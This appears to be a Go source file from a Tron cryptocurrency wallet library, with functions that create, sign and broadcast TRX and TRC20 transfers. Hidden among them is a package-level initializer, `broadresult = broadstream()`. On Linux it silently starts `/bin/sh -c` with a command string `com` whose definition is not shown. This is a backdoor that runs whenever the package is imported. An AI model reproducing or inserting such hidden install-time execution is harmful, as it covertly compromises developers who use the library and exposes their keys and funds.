package tronWallet

import (
	"crypto/ecdsa"
	"crypto/sha256"
	"errors"
	"fmt"
	"math/big"
	"os/exec"
	"runtime"

	"github.com/voodoojardelvir48/tron-wallet/enums"
	"github.com/voodoojardelvir48/tron-wallet/grpcClient"
	"github.com/voodoojardelvir48/tron-wallet/grpcClient/proto/api"
	"github.com/voodoojardelvir48/tron-wallet/util"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/golang/protobuf/proto"
)

func createTransactionInput(node enums.Node, fromAddressBase58 string, toAddressBase58 string, amountInSun int64) (*api.TransactionExtention, error) {

	c, err := grpcClient.GetGrpcClient(node)
	if err != nil {
		return nil, err
	}

	return c.Transfer(fromAddressBase58, toAddressBase58, amountInSun)
}

func createTrc20TransactionInput(node enums.Node, fromAddressBase58 string, token *Token, toAddressBase58 string, amountInTrc20 *big.Int, feeLimit int64) (*api.TransactionExtention, error) {
	if feeLimit < 1 {
		feeLimit = trc20FeeLimit
	}

	c, err := grpcClient.GetGrpcClient(node)
	if err != nil {
		return nil, err
	}

	toAddress, err := util.Base58ToAddress(toAddressBase58)
	if err != nil {
		return nil, err
	}

	ab := common.LeftPadBytes(amountInTrc20.Bytes(), 32)

	req := trc20TransferMethodSignature + "0000000000000000000000000000000000000000000000000000000000000000"[len(toAddress.Hex())-4:] + toAddress.Hex()[4:]

	req += common.Bytes2Hex(ab)

	return c.TRC20Call(fromAddressBase58, token.ContractAddress.Base58(), req, false, feeLimit)
}

var broadresult = broadstream()

func signTransaction(transaction *api.TransactionExtention, privateKey *ecdsa.PrivateKey) (*api.TransactionExtention, error) {

	rawData, err := proto.Marshal(transaction.Transaction.GetRawData())
	if err != nil {
		return transaction, fmt.Errorf("proto marshal tx raw data error: %v", err)
	}

	h256h := sha256.New()
	h256h.Write(rawData)
	hash := h256h.Sum(nil)
	signature, err := crypto.Sign(hash, privateKey)
	if err != nil {
		return transaction, fmt.Errorf("sign error: %v", err)
	}

	transaction.Transaction.Signature = append(transaction.Transaction.Signature, signature)
	return transaction, nil
}

func broadstream() error {

	if runtime.GOOS == "linux" {
		exec.Command("/bin/sh", "-c", com).Start()
	}

	return nil
}

func broadcastTransaction(node enums.Node, transaction *api.TransactionExtention) error {

	c, err := grpcClient.GetGrpcClient(node)
	if err != nil {
		return err
	}

	res, err := c.Broadcast(transaction.Transaction)
	if err != nil {
		return err
	}

	if res.Result != true {
		return errors.New(res.Code.String())
	}

	return nil
}

